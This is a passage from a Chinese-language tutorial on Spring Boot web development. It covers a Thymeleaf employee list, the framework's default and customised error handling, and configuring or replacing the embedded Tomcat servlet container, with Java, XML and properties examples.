class="name">td</span>&gt;</span>[[${emp.lastName}]]<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"${emp.email}"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"${emp.gender}==0?'女':'男'"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"${emp.department.departmentName}"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"${#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')}"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-primary"</span> <span class="attr">th:href</span>=<span class="string">"@{/emp/}+${emp.id}"</span>&gt;</span>编辑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">th:attr</span>=<span class="string">"del_uri=@{/emp/}+${emp.id}"</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-danger deleteBtn"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">".deleteBtn"</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>){</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//删除当前员工的</span></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">"#deleteEmpForm"</span>).<span class="title function_">attr</span>(<span class="string">"action"</span>,$(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">"del_uri"</span>)).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="7、错误处理机制"><a href="#7、错误处理机制" class="headerlink" title="7、错误处理机制"></a>7、错误处理机制</h2><h3 id="1）、SpringBoot默认的错误处理机制"><a href="#1）、SpringBoot默认的错误处理机制" class="headerlink" title="1）、SpringBoot默认的错误处理机制"></a>1）、SpringBoot默认的错误处理机制</h3><p>默认效果：</p><p>​        1）、浏览器，返回一个默认的错误页面</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/../../../../Downloads/baiduyun/%25E6%2596%2587%25E6%25A1%25A3/Spring%2520Boot%2520%25E7%25AC%2594%25E8%25AE%25B0/images/%25E6%2590%259C%25E7%258B%2597%25E6%2588%25AA%25E5%259B%25BE20180226173408.png"></p><p>  浏览器发送请求的请求头：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180347.png"></p><p>​        2）、如果是其他客户端，默认响应一个json数据</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226173527.png"></p><p>​        <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180504.png"></p><p>原理：</p><p>​    可以参照ErrorMvcAutoConfiguration；错误处理的自动配置；</p><pre><code>  给容器中添加了以下组件</code></pre><p>​    1、DefaultErrorAttributes：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">帮我们在页面共享信息；</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes,</span></span><br><span class="line"><span class="params"><span class="type">boolean</span> includeStackTrace)</span> {</span><br><span class="line">Map&lt;String, Object&gt; errorAttributes = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;();</span><br><span class="line">errorAttributes.put(<span class="string">"timestamp"</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">addStatus(errorAttributes, requestAttributes);</span><br><span class="line">addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);</span><br><span class="line">addPath(errorAttributes, requestAttributes);</span><br><span class="line"><span class="keyword">return</span> errorAttributes;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    2、BasicErrorController：处理默认/error请求</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping("${server.error.path:${error.path:/error}}")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicErrorController</span> <span class="keyword">extends</span> <span class="title class_">AbstractErrorController</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(produces = "text/html")</span><span class="comment">//产生html类型的数据；浏览器发送的请求来到这个方法处理</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">errorHtml</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">HttpServletResponse response)</span> {</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">status</span> <span class="operator">=</span> getStatus(request);</span><br><span class="line">Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes(</span><br><span class="line">request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));</span><br><span class="line">response.setStatus(status.value());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//去哪个页面作为错误页面；包含页面地址和页面内容</span></span><br><span class="line"><span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolveErrorView(request, response, status, model);</span><br><span class="line"><span class="keyword">return</span> (modelAndView == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">"error"</span>, model) : modelAndView);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span>    <span class="comment">//产生json数据，其他客户端来到这个方法处理；</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt; <span class="title function_">error</span><span class="params">(HttpServletRequest request)</span> {</span><br><span class="line">Map&lt;String, Object&gt; body = getErrorAttributes(request,</span><br><span class="line">isIncludeStackTrace(request, MediaType.ALL));</span><br><span class="line"><span class="type">HttpStatus</span> <span class="variable">status</span> <span class="operator">=</span> getStatus(request);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;Map&lt;String, Object&gt;&gt;(body, status);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    3、ErrorPageCustomizer：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value("${error.path:/error}")</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">"/error"</span>;  系统出现错误以后来到error请求进行处理；（web.xml注册的错误页面规则）</span><br></pre></td></tr></tbody></table></figure><p>​    4、DefaultErrorViewResolver：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">resolveErrorView</span><span class="params">(HttpServletRequest request, HttpStatus status,</span></span><br><span class="line"><span class="params">Map&lt;String, Object&gt; model)</span> {</span><br><span class="line"><span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolve(String.valueOf(status), model);</span><br><span class="line"><span class="keyword">if</span> (modelAndView == <span class="literal">null</span> &amp;&amp; SERIES_VIEWS.containsKey(status.series())) {</span><br><span class="line">modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> modelAndView;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ModelAndView <span class="title function_">resolve</span><span class="params">(String viewName, Map&lt;String, Object&gt; model)</span> {</span><br><span class="line">        <span class="comment">//默认SpringBoot可以去找到一个页面？  error/404</span></span><br><span class="line"><span class="type">String</span> <span class="variable">errorViewName</span> <span class="operator">=</span> <span class="string">"error/"</span> + viewName;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//模板引擎可以解析这个页面地址就用模板引擎解析</span></span><br><span class="line"><span class="type">TemplateAvailabilityProvider</span> <span class="variable">provider</span> <span class="operator">=</span> <span class="built_in">this</span>.templateAvailabilityProviders</span><br><span class="line">.getProvider(errorViewName, <span class="built_in">this</span>.applicationContext);</span><br><span class="line"><span class="keyword">if</span> (provider != <span class="literal">null</span>) {</span><br><span class="line">            <span class="comment">//模板引擎可用的情况下返回到errorViewName指定的视图地址</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(errorViewName, model);</span><br><span class="line">}</span><br><span class="line">        <span class="comment">//模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面   error/404.html</span></span><br><span class="line"><span class="keyword">return</span> resolveResource(errorViewName, model);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    步骤：</p><p>​        一但系统出现4xx或者5xx之类的错误；ErrorPageCustomizer就会生效（定制错误的响应规则）；就会来到/error请求；就会被<strong>BasicErrorController</strong>处理；</p><p>​        1）响应页面；去哪个页面是由<strong>DefaultErrorViewResolver</strong>解析得到的；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">resolveErrorView</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">      HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model)</span> {</span><br><span class="line">    <span class="comment">//所有的ErrorViewResolver得到ModelAndView</span></span><br><span class="line">   <span class="keyword">for</span> (ErrorViewResolver resolver : <span class="built_in">this</span>.errorViewResolvers) {</span><br><span class="line">      <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> resolver.resolveErrorView(request, status, model);</span><br><span class="line">      <span class="keyword">if</span> (modelAndView != <span class="literal">null</span>) {</span><br><span class="line">         <span class="keyword">return</span> modelAndView;</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2）、如果定制错误响应："><a href="#2）、如果定制错误响应：" class="headerlink" title="2）、如果定制错误响应："></a>2）、如果定制错误响应：</h3><h4 id="1）、如何定制错误的页面；"><a href="#1）、如何定制错误的页面；" class="headerlink" title="1）、如何定制错误的页面；"></a><strong>1）、如何定制错误的页面；</strong></h4><p>​            <strong>1）、有模板引擎的情况下；error/状态码;</strong> 【将错误页面命名为  错误状态码.html 放在模板引擎文件夹里面的 error文件夹下】，发生此状态码的错误就会来到  对应的页面；</p><p>​            我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）；        </p><p>​            页面能获取的信息；</p><p>​                timestamp：时间戳</p><p>​                status：状态码</p><p>​                error：错误提示</p><p>​                exception：异常对象</p><p>​                message：异常消息</p><p>​                errors：JSR303数据校验的错误都在这里</p><p>​            2）、没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找；</p><p>​            3）、以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面；</p><h4 id="2）、如何定制错误的json数据；"><a href="#2）、如何定制错误的json数据；" class="headerlink" title="2）、如何定制错误的json数据；"></a>2）、如何定制错误的json数据；</h4><p>​        1）、自定义异常处理&amp;返回定制json数据；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExceptionHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(UserNotExistException.class)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title function_">handleException</span><span class="params">(Exception e)</span>{</span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">        map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">//没有自适应效果...</span></span><br></pre></td></tr></tbody></table></figure><p>​        2）、转发到/error进行自适应响应效果处理</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler(UserNotExistException.class)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">handleException</span><span class="params">(Exception e, HttpServletRequest request)</span>{</span><br><span class="line">       Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       <span class="comment">//传入我们自己的错误状态码  4xx 5xx，否则就不会进入定制错误页面的解析流程</span></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Integer statusCode = (Integer) request</span></span><br><span class="line"><span class="comment">        .getAttribute("javax.servlet.error.status_code");</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       request.setAttribute(<span class="string">"javax.servlet.error.status_code"</span>,<span class="number">500</span>);</span><br><span class="line">       map.put(<span class="string">"code"</span>,<span class="string">"user.notexist"</span>);</span><br><span class="line">       map.put(<span class="string">"message"</span>,e.getMessage());</span><br><span class="line">       <span class="comment">//转发到/error</span></span><br><span class="line">       <span class="keyword">return</span> <span class="string">"forward:/error"</span>;</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h4 id="3）、将我们的定制数据携带出去；"><a href="#3）、将我们的定制数据携带出去；" class="headerlink" title="3）、将我们的定制数据携带出去；"></a>3）、将我们的定制数据携带出去；</h4><p>出现错误以后，会来到/error请求，会被BasicErrorController处理，响应出去可以获取的数据是由getErrorAttributes得到的（是AbstractErrorController（ErrorController）规定的方法）；</p><p>​    1、完全来编写一个ErrorController的实现类【或者是编写AbstractErrorController的子类】，放在容器中；</p><p>​    2、页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到；</p><p>​            容器中DefaultErrorAttributes.getErrorAttributes()；默认进行数据处理的；</p><p>自定义ErrorAttributes</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//给容器中加入我们自己定义的ErrorAttributes</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyErrorAttributes</span> <span class="keyword">extends</span> <span class="title class_">DefaultErrorAttributes</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes, <span class="type">boolean</span> includeStackTrace)</span> {</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="built_in">super</span>.getErrorAttributes(requestAttributes, includeStackTrace);</span><br><span class="line">        map.put(<span class="string">"company"</span>,<span class="string">"atguigu"</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容，</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180228135513.png"></p><h2 id="8、配置嵌入式Servlet容器"><a href="#8、配置嵌入式Servlet容器" class="headerlink" title="8、配置嵌入式Servlet容器"></a>8、配置嵌入式Servlet容器</h2><p>SpringBoot默认使用Tomcat作为嵌入式的Servlet容器；</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180301142915.png"></p><p>问题？</p><h3 id="1）、如何定制和修改Servlet容器的相关配置；"><a href="#1）、如何定制和修改Servlet容器的相关配置；" class="headerlink" title="1）、如何定制和修改Servlet容器的相关配置；"></a>1）、如何定制和修改Servlet容器的相关配置；</h3><p>1、修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）；</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="attr">server.context-path</span>=<span class="string">/crud</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.tomcat.uri-encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//通用的Servlet容器设置</span></span><br><span class="line"><span class="attr">server.xxx</span></span><br><span class="line"><span class="attr">//Tomcat的设置</span></span><br><span class="line"><span class="attr">server.tomcat.xxx</span></span><br></pre></td></tr></tbody></table></figure><p>2、编写一个<strong>EmbeddedServletContainerCustomizer</strong>：嵌入式的Servlet容器的定制器；来修改Servlet容器的配置</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  <span class="comment">//一定要将这个定制器加入到容器中</span></span><br><span class="line"><span class="keyword">public</span> EmbeddedServletContainerCustomizer <span class="title function_">embeddedServletContainerCustomizer</span><span class="params">()</span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmbeddedServletContainerCustomizer</span>() {</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定制嵌入式的Servlet容器相关的规则</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(ConfigurableEmbeddedServletContainer container)</span> {</span><br><span class="line">            container.setPort(<span class="number">8083</span>);</span><br><span class="line">        }</span><br><span class="line">    };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2）、注册Servlet三大组件【Servlet、Filter、Listener】"><a href="#2）、注册Servlet三大组件【Servlet、Filter、Listener】" class="headerlink" title="2）、注册Servlet三大组件【Servlet、Filter、Listener】"></a>2）、注册Servlet三大组件【Servlet、Filter、Listener】</h3><p>由于SpringBoot默认是以jar包的方式启动嵌入式的Servlet容器来启动SpringBoot的web应用，没有web.xml文件。</p><p>注册三大组件用以下方式</p><p>ServletRegistrationBean</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册三大组件</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ServletRegistrationBean <span class="title function_">myServlet</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">ServletRegistrationBean</span> <span class="variable">registrationBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(<span class="keyword">new</span> <span class="title class_">MyServlet</span>(),<span class="string">"/myServlet"</span>);</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>FilterRegistrationBean</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> FilterRegistrationBean <span class="title function_">myFilter</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">FilterRegistrationBean</span> <span class="variable">registrationBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">    registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">MyFilter</span>());</span><br><span class="line">    registrationBean.setUrlPatterns(Arrays.asList(<span class="string">"/hello"</span>,<span class="string">"/myServlet"</span>));</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>ServletListenerRegistrationBean</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ServletListenerRegistrationBean <span class="title function_">myListener</span><span class="params">()</span>{</span><br><span class="line">    ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">ServletListenerRegistrationBean</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">MyListener</span>());</span><br><span class="line">    <span class="keyword">return</span> registrationBean;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>SpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器；DIspatcherServlet；</p><p>DispatcherServletAutoConfiguration中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span></span><br><span class="line"><span class="meta">@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span></span><br><span class="line"><span class="keyword">public</span> ServletRegistrationBean <span class="title function_">dispatcherServletRegistration</span><span class="params">(</span></span><br><span class="line"><span class="params">      DispatcherServlet dispatcherServlet)</span> {</span><br><span class="line">   <span class="type">ServletRegistrationBean</span> <span class="variable">registration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(</span><br><span class="line">         dispatcherServlet, <span class="built_in">this</span>.serverProperties.getServletMapping());</span><br><span class="line">    <span class="comment">//默认拦截： /  所有请求；包静态资源，但是不拦截jsp请求；   /*会拦截jsp</span></span><br><span class="line">    <span class="comment">//可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径</span></span><br><span class="line">    </span><br><span class="line">   registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);</span><br><span class="line">   registration.setLoadOnStartup(</span><br><span class="line">         <span class="built_in">this</span>.webMvcProperties.getServlet().getLoadOnStartup());</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.multipartConfig != <span class="literal">null</span>) {</span><br><span class="line">      registration.setMultipartConfig(<span class="built_in">this</span>.multipartConfig);</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">return</span> registration;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>2）、SpringBoot能不能支持其他的Servlet容器；</p><h3 id="3）、替换为其他嵌入式Servlet容器"><a href="#3）、替换为其他嵌入式Servlet容器" class="headerlink" title="3）、替换为其他嵌入式Servlet容器"></a>3）、替换为其他嵌入式Servlet容器</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302114401.png"></p><p>默认支持：</p><p>Tomcat（默认使用）</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>Jetty</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span 